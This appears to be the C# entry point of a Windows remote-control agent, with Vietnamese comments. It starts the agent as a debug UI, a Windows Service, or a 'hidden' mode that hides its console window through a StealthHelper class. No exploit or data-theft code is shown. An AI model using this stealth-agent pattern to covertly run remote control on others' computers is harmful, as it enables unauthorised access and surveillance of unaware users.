// RemoteControl.Agent - Entry Point (Dual-Mode Support)
// Hỗ trợ 3 mode chạy:
//   --mode=debug   : Debug UI với WinForms (mặc định)
//   --mode=service : Chạy như Windows Service
//   --mode=hidden  : Chạy ẩn không có UI

using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using RemoteControl.Agent.Helpers;
using RemoteControl.Agent.UI;
using RemoteControl.Agent.Workers;

// ====== Parse Command-Line Arguments ======
var mode = GetRunMode(args);
Console.WriteLine($"[Agent] Starting in {mode} mode...");

// Build Configuration
var configBuilder = new ConfigurationBuilder()
    .SetBasePath(Directory.GetCurrentDirectory())
    .AddJsonFile("appsettings.json", optional: true, reloadOnChange: true)
    .AddCommandLine(args);
IConfiguration configuration = configBuilder.Build();

// ====== Run theo mode ======
switch (mode)
{
    case RunMode.Service:
        await RunAsServiceAsync(configuration, args);
        break;
    
    case RunMode.Hidden:
        await RunHiddenAsync(configuration);
        break;
    
    case RunMode.Debug:
    default:
        RunDebugUI(configuration);
        break;
}

// ====== Helper: Parse run mode từ args ======
static RunMode GetRunMode(string[] args)
{
    foreach (var arg in args)
    {
        if (arg.Equals("--mode=service", StringComparison.OrdinalIgnoreCase))
            return RunMode.Service;
        if (arg.Equals("--mode=hidden", StringComparison.OrdinalIgnoreCase))
            return RunMode.Hidden;
        if (arg.Equals("--mode=debug", StringComparison.OrdinalIgnoreCase))
            return RunMode.Debug;
        // Legacy support
        if (arg.Equals("--hidden", StringComparison.OrdinalIgnoreCase))
            return RunMode.Hidden;
        if (arg.Equals("--service", StringComparison.OrdinalIgnoreCase))
            return RunMode.Service;
    }
    return RunMode.Debug;
}

// ====== Mode 1: Debug UI (WinForms) ======
static void RunDebugUI(IConfiguration configuration)
{
    Console.WriteLine("[Agent] Running Debug UI mode...");
    
    Application.SetHighDpiMode(HighDpiMode.SystemAware);
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    Application.Run(new AgentDebugForm(configuration));
}

// ====== Mode 2: Windows Service ======
static async Task RunAsServiceAsync(IConfiguration configuration, string[] args)
{
    Console.WriteLine("[Agent] Running as Windows Service...");

    var builder = Host.CreateApplicationBuilder(args);
    
    // Add configuration
    builder.Configuration.AddConfiguration(configuration);
    
    // Add the worker service
    builder.Services.AddSingleton<IConfiguration>(configuration);
    builder.Services.AddHostedService<AgentWorker>();
    
    // Configure as Windows Service
    builder.Services.AddWindowsService(options =>
    {
        options.ServiceName = "RemoteControlAgent";
    });

    var host = builder.Build();
    await host.RunAsync();
}

// ====== Mode 3: Hidden (Background, no UI) ======
static async Task RunHiddenAsync(IConfiguration configuration)
{
    Console.WriteLine("[Agent] Running in hidden mode...");
    
    // Ẩn console nếu có
    if (StealthHelper.HasConsole())
    {
        StealthHelper.HideConsoleWindow();
    }

    // Chạy worker như console app nhưng không có UI
    var builder = Host.CreateApplicationBuilder();
    builder.Configuration.AddConfiguration(configuration);
    builder.Services.AddSingleton<IConfiguration>(configuration);
    builder.Services.AddHostedService<AgentWorker>();

    var host = builder.Build();
    await host.RunAsync();
}

// ====== Run Mode Enum ======
enum RunMode
{
    Debug,   // WinForms Debug UI
    Service, // Windows Service
    Hidden   // Background without UI
}
